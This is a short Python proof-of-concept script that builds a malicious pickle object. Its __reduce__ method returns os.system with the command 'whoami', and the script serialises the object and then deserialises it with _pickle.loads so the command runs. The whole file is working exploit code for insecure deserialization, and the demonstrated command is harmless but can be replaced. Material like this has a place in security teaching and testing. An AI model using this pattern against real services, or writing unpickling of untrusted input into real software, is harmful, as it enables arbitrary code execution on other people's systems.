import os
import _pickle

class Exploit(object):
def __reduce__(self):
return (os.system, ('whoami',))

def serialize_exploit():
shellcode = _pickle.dumps(Exploit())
return shellcode

def insecure_deserialization(exploit_code):
_pickle.loads(exploit_code)

if __name__ == '__main__':
shellcode = serialize_exploit()
insecure_deserialization(shellcode)
